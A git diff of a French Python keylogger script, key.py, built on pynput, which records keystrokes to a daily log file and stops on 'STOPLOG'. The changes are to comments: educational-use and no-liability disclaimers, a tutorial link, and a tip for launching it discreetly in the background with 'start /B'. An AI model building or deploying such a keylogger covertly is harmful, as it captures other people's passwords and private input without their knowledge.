@@ -1,10 +1,11 @@
 # key.py - Un keylogger simple utilisant pynput
 # Enregistre les frappes dans un fichier journal quotidien
-#, et s'arrête lorsque le mot-clé "STOPLOG" est détecté
+# et s'arrête lorsque le mot-clé "STOPLOG" est détecté
 
 # DANGER : ceci est un exercice éducatif. N'utilisez ce code qu'avec l'autorisation explicite des propriétaires des systèmes ciblés.
-
-# Tuto src=https://blog.crea-troyes.fr/5753/coder-un-keylogger-en-python-guide-complet/#aioseo-preparer-son-environnement
+# Ne l'utilisez pas à des fins malveillantes et uniuementdans votre propre environnement ! 
+# Je décline toute responsabilité en cas d'utilisation/amélioration/mise en place de smtp abusive de ce code ! 
+# Tuto source = https://blog.crea-troyes.fr/5753/coder-un-keylogger-en-python-guide-complet/#aioseo-preparer-son-environnement
 from pynput.keyboard import Listener, Key
 import logging
 from datetime import datetime
@@ -60,4 +61,5 @@ def on_release(key):
 # Lancement du listener
 with Listener(on_press=on_press, on_release=on_release) as listener:
     print("Keylogger lancé. Appuyez sur Échap ou tapez 'STOPLOG' pour arrêter.")
+    #lancer discretement en arriere plan = start /B python key.py
     listener.join()
